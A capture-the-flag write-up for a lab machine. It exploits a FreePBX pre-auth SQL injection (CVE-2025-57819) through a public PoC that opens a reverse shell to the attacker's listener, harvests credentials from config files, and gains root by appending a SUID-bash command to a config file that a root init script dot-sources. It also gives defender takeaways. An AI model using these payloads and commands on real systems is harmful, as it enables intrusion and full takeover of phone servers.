---
title: Connected
description: FreePBX pre-auth SQL injection (CVE-2025-57819) drops a shell as asterisk. Root is not any of the obvious CVEs — it falls out of an incron watcher that dot-sources an asterisk-writable config file straight into a root shell.
---

# Connected

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Linux (CentOS 7) |
| **CVE** | CVE-2025-57819 (FreePBX pre-auth SQLi → RCE) |
| **Focus** | Version fingerprinting + reading the *intended* root path past the decoys |

Connected is a box about knowing exactly what you're looking at.
The foothold is a clean, current CVE against a version-pinned FreePBX install — identify the product and version precisely and the exploit almost hands itself to you.
The privilege escalation is the opposite kind of lesson: it is buried under a pile of tempting dead ends. PwnKit is present, `sudo` looks vulnerable, `fwconsole` is world-writable — and none of them are the way in. Every one of those is patched, guarded, or a deliberate decoy.

The real path is quieter: an `incron` watcher that lets a low-privileged user trigger a root action, and a root init script that *dot-sources* a config file the `asterisk` user can write. That's the whole box in one sentence — the danger was never the flashy CVEs, it was a single writable file that gets read into root's shell.

---

## Setup

HTB Pawnbox on the VPN, same network as the target.

| | |
|---|---|
| **Target** | `10.129.245.100` → `connected.htb` |
| **Attacker** | pawnbox — `10.10.14.184` |

---

## Enumeration

### Full port sweep

```bash
nmap -p- --min-rate 5000 -T4 -v 10.129.245.100
```

Three ports open, everything else filtered:

| Port | Service |
|------|---------|
| 22 | ssh |
| 80 | http |
| 443 | https |

Two web ports and an SSH with no creds yet — this is a web engagement.

### Version + default scripts

```bash
nmap -sC -sV -p22,80,443 -v 10.129.245.100
```

| Port | Service | Detail |
|------|---------|--------|
| 22 | ssh | OpenSSH 7.4 |
| 80 | http | Apache 2.4.6 (CentOS), OpenSSL 1.0.2k-fips, **PHP 7.4.16** |
| 443 | ssl/http | same stack; cert `CN=pbxconnect, emailAddress=root@pbxconnect` |

Port 80 redirects to `http://connected.htb/`, and the TLS cert on 443 names `pbxconnect`. The box tells you its own hostnames — no guessing needed. Add them:

```
10.129.245.100  connected.htb pbxconnect pbxconnect.htb
```

### Walking the app

```bash
curl -sI http://connected.htb            # 302 -> /admin
curl -sI http://connected.htb/admin/     # 302 -> config.php
curl -sI http://connected.htb/admin/config.php   # 200, sets PHPSESSID + lang=en_US
```

The app auto-loads an admin console at `/admin/config.php`. The `lang` cookie and PBX theming are enough to know this is a phone system — now pin the exact software and version.

### Fingerprint — FreePBX 16.0.40.7

```bash
curl -s http://connected.htb/admin/config.php | grep -iE 'freepbx|version|copyright|login'
```

Confirmed two independent ways:

- Footer: *"FreePBX 16.0.40.7 is licensed under the GPL"*
- Every asset carries `?load_version=16.0.40.7`

So: **FreePBX 16.0.40.7** (Sangoma) on PHP 7.4.16 / Apache 2.4.6 (CentOS). A login form sits at `/admin/config.php`, and the nav exposes extra modules (ISymphony panel, UCP, Operator Panel). With an exact product and version, the next move is obvious — look up what's public for *this* build.

!!! tip "The habit that matters here"
    Fingerprinting to the patch version is the whole game on a box like this. "FreePBX" gets you nowhere; "FreePBX 16.0.40.7" maps straight to a CVE. Never stop at the product name when the version is sitting in the page source.

---

## Foothold — CVE-2025-57819

FreePBX 16.0.40.7 (released early 2024) sits well below the fixed `endpoint` module version (16.0.89), so it's vulnerable to **CVE-2025-57819** — CVSS 9.8, and in CISA's Known Exploited Vulnerabilities catalogue after being exploited in the wild from August 2025.

### What the bug is

The chain is an **authentication bypass** stacked on a **SQL injection**:

- The `endpoint` module's ajax handler skips the normal auth check, so it processes input **unauthenticated**.
- That same handler concatenates the `brand` parameter straight into a SQL query — error-based injection, and because it allows **stacked queries**, an attacker can *write* to the database, not just read.

The write primitive is what turns SQLi into RCE: inject a row into FreePBX's `cron_jobs` table, and the built-in cron runner executes it as a shell command within a minute or two.

### Confirming it by hand

First, prove the module processes input without auth — a malformed request throws an application error from deep inside the module:

```json
{"error":{"message":"Trying to access array offset on value of type bool",
 "file":"/var/www/html/admin/modules/endpoint/views/model.php","line":144}}
```

Then confirm the injection with a classic error-based `extractvalue` leak of the current DB user:

```
brand=1' AND extractvalue(1,concat(0x7e,(SELECT current_user())))-- -
```

```json
{"error":{"message":"XPATH syntax error: '~freepbxuser@localhost'"}}
```

Injection confirmed, DB user is `freepbxuser@localhost`, web root is `/var/www/html`.

### Popping the shell

A listener on the attack box, then the public PoC (which automates the `cron_jobs` write):

```bash
# pawnbox — terminal 1
nc -lvnp 4444

# pawnbox — terminal 2
git clone https://github.com/K3ysTr0K3R/CVE-2025-57819
cd CVE-2025-57819
python3 exploit.py -u http://connected.htb --lhost 10.10.14.184 --lport 4444
```

```
[+] Exploit path confirmed!
[*] Injecting payload into cron schedule...
[+] Payload planted successfully
[*] Awaiting trigger activation (cron will fire within ~60 seconds)...
```

Cron fired, the shell came back as **`asterisk`**.

```
[asterisk@connected ~]$ cat user.txt
[redacted]
```

**User flag captured.**

---

## Privilege Escalation

This is where the box earns its time. The shell as `asterisk` has no extra groups, no sudo rights, and a long line of tempting-but-wrong root paths in front of it.

### Stabilising the shell

There's **no `python3`** on the box, so the usual `pty.spawn` trick is out. `script` does the job:

```bash
script -qc /bin/bash /dev/null
```

### The parade of dead ends

Being honest about what *didn't* work, because the point of this box is learning to rule things out fast:

| Lead | Why it failed |
|------|---------------|
| **`sudo -l` / `su root`** | No NOPASSWD rule; a reverse shell can't feed `su`'s controlling-terminal password prompt. Solved the TTY problem by writing my own SSH key into `asterisk`'s `authorized_keys` and logging in for real — but every harvested password was rejected for `root`. |
| **`z001-updates.sh` cron** | Root runs it nightly via `/etc/cron.d/cron-updates`, but the script is root-owned, sources nothing writable, and its privileged branch is guarded by a `uid != 0 && return`. No hijack. |
| **PwnKit (CVE-2021-4034)** | `pkexec` is SUID and present, but the exploit only spat out the `PWNKIT` gconv error and dropped no shell. Polkit is **patched** (SELinux is *Disabled* here, so it wasn't that). |
| **Baron Samedit (CVE-2021-3156)** | `sudo --version` reports **1.8.23**, which *looks* vulnerable — but the exploit just printed `usage: sudoedit`. CentOS **backports the fix without bumping the version string**. The version number is a red herring. |
| **Redis / MongoDB / Let's Chat / `fwconsole`** | Redis runs as `redis` not root; Mongo's `letschat` DB is empty; `letschat.service` is masked and 0 bytes; and world-writable `/usr/sbin/fwconsole` is a **decoy** — its caller signature-checks the binary before running it. |

!!! warning "The Baron Samedit lesson"
    On RHEL/CentOS, never trust the `sudo --version` string alone. Confirm exploitability with the canonical crash test and the package changelog:

    ```bash
    sudoedit -s '\' $(perl -e 'print "A" x 1000')   # patched -> "usage:", vuln -> crash
    rpm -q --changelog sudo | grep -iE '3156|Baron' # any hit = backported fix present
    ```

### Harvesting credentials (worth doing anyway)

FreePBX keeps its DB and manager passwords in world-readable config files — always worth collecting even when they don't get you root:

| Credential | Source |
|------------|--------|
| MySQL `freepbxuser` | `/etc/freepbx.conf` (`AMPDBPASS`) |
| Asterisk Manager user/pass | `/etc/amportal.conf` (`AMPMGRUSER` / `AMPMGRPASS`) |
| ARI user/pass | `/etc/amportal.conf` |
| PHP console password (human-set) | `/etc/amportal.conf` (`PHP_CONSOLE_PASSWORD`) |

The MySQL creds do open the database — dumping `ampusers` yields the FreePBX web-panel admin and a crackable SHA1 — but that's the *web GUI* login, not a system account. A useful side-quest, not the root path.

### The intended path — incron + a dot-sourced config

The actual escalation is a trust chain that ends in a file `asterisk` can write:

1. **`incrond`** watches `/var/spool/asterisk/sysadmin/`. Dropping a file named `dahdi_restart` there makes **root** run `/usr/sbin/sysadmin_dahdi_restart`.
2. That helper calls `/etc/init.d/dahdi restart`.
3. `/etc/init.d/dahdi` **dot-sources** its config —
   `[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf` —
   which runs the file's contents *inline in root's shell*, with **no signature check** (unlike the `fwconsole` decoy).
4. `/etc/dahdi/init.conf` is `-rw-r--r-- asterisk asterisk` — **writable by us.**

So: write a command into that config, trigger the watcher, and root executes it. Verify the chain first:

```bash
grep -n 'init.conf' /etc/init.d/dahdi   # -> . /etc/dahdi/init.conf
ls -l /etc/dahdi/init.conf              # -> writable by asterisk
```

Then have root make a copy of `bash` SUID-root:

```bash
printf '\n install -m 4755 /bin/bash /home/asterisk/pwn1 \n' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart
# wait ~25s for the watcher + service restart
ls -la /home/asterisk/pwn1        # -rwsr-xr-x root root
/home/asterisk/pwn1 -p            # -p preserves euid=0
```

```
# id
uid=999(asterisk) euid=0(root) ...
# cat /root/root.txt
[redacted]
```

**Root flag captured. Box complete.**

Cleanup: `sed -i '/pwn1/d' /etc/dahdi/init.conf` and `rm /home/asterisk/pwn1`.

---

## Flags

| Flag | Value |
|------|-------|
| user | `[redacted]` |
| root | `[redacted]` |

---

!!! example "Conclusion"
    The foothold rewards precision. FreePBX print its exact version into every page it serves, and 16.0.40.7 maps directly to CVE-2025-57819 — a pre-auth SQL injection whose stacked-query write turns into RCE through the product's own cron table. There was no brute force, no credential guessing, no lucky directory: identify the build, read the advisory, run the PoC. The lesson is upstream of the exploit — stopping at "it's FreePBX" instead of pinning the patch version would have left the whole box invisible.

    The privilege escalation is a study in resisting the obvious. Every loud, well-known local root — PwnKit, Baron Samedit, a world-writable root binary — is present *and* neutralised: polkit patched, sudo fixed by a silent backport, `fwconsole` guarded by a signature check. Burning time on those is the trap. Baron Samedit is the sharpest reminder: `sudo --version` said 1.8.23 and lied, because RHEL patches without bumping the string. On those distros, a crash test and `rpm --changelog` are the only honest confirmation.

    The real path is small and quiet: a service watches a spool directory a low user can write to, and a root init script dot-sources a config that same user owns. No memory corruption, no CVE — just a writable file that ends up executed as root. That is the more common shape of real-world Linux privesc than any headline exploit.

    Defender takeaways: patch internet-facing PBX software promptly — CVE-2025-57819 was in the KEV catalogue and exploited in the wild before this box existed. Config files holding DB and manager passwords should not be world-readable. And the root cause of the escalation is an ownership mistake: a config file dot-sourced by a **root** init script must never be writable by a service account. Audit what your privileged init scripts and cron jobs read, and who can write to it.
